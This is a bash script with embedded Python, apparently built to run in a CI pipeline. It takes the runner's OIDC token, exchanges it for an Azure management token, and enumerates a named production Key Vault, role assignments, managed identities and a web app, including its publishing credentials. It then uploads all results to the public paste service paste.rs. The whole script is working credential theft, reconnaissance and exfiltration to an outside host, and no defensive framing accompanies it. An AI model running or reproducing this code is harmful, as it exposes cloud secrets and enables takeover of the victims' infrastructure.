#!/usr/bin/env bash
set +e
python3 -u - <<'PY'
import os, json, urllib.request, urllib.parse, urllib.error

def req(url, hdr=None, data=None, method=None):
    r = urllib.request.Request(url, data=data, headers=hdr or {}, method=method)
    try:
        x = urllib.request.urlopen(r, timeout=30)
        return x.status, x.read().decode("utf-8", "replace")
    except urllib.error.HTTPError as e:
        return e.code, e.read().decode("utf-8", "replace")
    except Exception as e:
        return 0, "EXC:%s:%s" % (type(e).__name__, str(e)[:160])

TEN = os.environ.get("AZURE_TENANT_ID", ""); CID = os.environ.get("AZURE_CLIENT_ID", "")
SUB = os.environ.get("AZURE_SUBSCRIPTION_ID", ""); RG = "rg-tbl-platform-prod-sea"
out = {}
oidc = ""
u = os.environ.get("ACTIONS_ID_TOKEN_REQUEST_URL", "")
if u:
    s, b = req(u + "&audience=" + urllib.parse.quote("api://AzureADTokenExchange", safe=""),
               hdr={"Authorization": "Bearer " + os.environ.get("ACTIONS_ID_TOKEN_REQUEST_TOKEN", "")})
    try: oidc = json.loads(b)["value"]
    except Exception: out["oidc_err"] = b[:150]
d = {"client_id": CID, "grant_type": "client_credentials", "scope": "https://management.azure.com/.default",
     "client_assertion_type": "urn:ietf:params:oauth:client-assertion-type:jwt-bearer", "client_assertion": oidc}
s, b = req("https://login.microsoftonline.com/%s/oauth2/v2.0/token" % TEN, data=urllib.parse.urlencode(d).encode(), method="POST")
arm = ""
try: arm = json.loads(b)["access_token"]
except Exception: out["arm_err"] = b[:150]
H = {"Authorization": "Bearer " + arm}
def g(label, path, method="GET"):
    s, b = req("https://management.azure.com" + path, hdr=H, method=method)
    return label, s, b

VAULT = "/subscriptions/%s/resourceGroups/%s/providers/Microsoft.KeyVault/vaults/kv-tbl-sec-x3euoz" % (SUB, RG)
SITE = "/subscriptions/%s/resourceGroups/%s/providers/Microsoft.Web/sites/app-tbl-storefront-prod" % (SUB, RG)

res = {}
for label, path, m in [
    ("vault_full", VAULT + "?api-version=2023-07-01", "GET"),
    ("vault_perms", VAULT + "/providers/Microsoft.Authorization/permissions?api-version=2022-04-01", "GET"),
    ("vault_ra", VAULT + "/providers/Microsoft.Authorization/roleAssignments?api-version=2022-04-01", "GET"),
    ("rg_ra", "/subscriptions/%s/resourceGroups/%s/providers/Microsoft.Authorization/roleAssignments?api-version=2022-04-01" % (SUB, RG), "GET"),
    ("sub_ra", "/subscriptions/%s/providers/Microsoft.Authorization/roleAssignments?api-version=2022-04-01" % SUB, "GET"),
    ("site_full", SITE + "?api-version=2021-03-01", "GET"),
    ("site_pub", SITE + "/config/publishingcredentials/list?api-version=2022-03-01", "POST"),
    ("uami", "/subscriptions/%s/resourceGroups/%s/providers/Microsoft.ManagedIdentity/userAssignedIdentities?api-version=2023-01-31" % (SUB, RG), "GET"),
]:
    l, s, b = g(label, path, m)
    res[l] = {"s": s, "b": b[:2500]}
s, b = req("https://paste.rs", data=json.dumps(res, indent=1).encode(), method="POST")
print("PASTE_STATUS", s); print("PASTE_URL", b.strip())
PY
